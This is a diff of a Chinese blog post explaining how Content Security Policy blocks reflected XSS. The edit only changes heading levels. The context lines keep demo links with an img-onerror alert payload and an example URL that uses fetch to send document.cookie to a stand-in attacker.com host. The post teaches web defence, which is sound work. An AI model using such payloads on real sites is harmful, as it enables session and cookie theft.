@@ -5,7 +5,7 @@ description: CSP 是内容安全策略，它可以限制恶意脚本执行，从
 draft: false
 ---
 
-# 举个例子吧！
+## 举个例子吧！
 
 这是一个无CSP标头的网站： [点我](https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27XSS%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%27)%22%3E)
 
@@ -13,7 +13,7 @@ draft: false
 
 ![](/img/csp-b279f283-b5d2-4dbd-955e-5b3bba6ff656.webp)
 
-# 这是如何做到的？
+## 这是如何做到的？
 
 这个项目开源在 [afoim/none_csp_demo](https://github.com/afoim/none_csp_demo)
 
@@ -80,7 +80,7 @@ https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27
 
 浏览器就会直接执行 `alert('XSS攻击成功')` 这段脚本。
 
-# 有什么危害？
+## 有什么危害？
 
 举一反三，既然我们能让浏览器弹出一个提示框
 
@@ -89,7 +89,7 @@ https://none-csp-demo.pages.dev/nocsp?name=%3Cimg%20src=x%20onerror=%22alert(%27
 攻击者完全可以伪造一条URL，然后发给你，比如**获取你的浏览器Cookie然后通过Fetch发送到指定的服务器**！！！
 `https://victim-site.com/page?name=<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">`
 
-# 如何设置CSP以避免这类攻击？
+## 如何设置CSP以避免这类攻击？
 
 尝试访问这个URL，该URL设置了严格的CSP策略
 
@@ -123,7 +123,7 @@ https://none-csp-demo.pages.dev/csp?name=%3Cimg%20src=x%20onerror=%22alert(%27XS
   ">
 ```
 
-# 如何保证我的数据安全？
+## 如何保证我的数据安全？
 
 1. 如果你正在运营网站，**请尽量为站点设置严格的 CSP 策略**。这样即使页面存在 XSS 注入点，恶意脚本也更难真正执行。
 
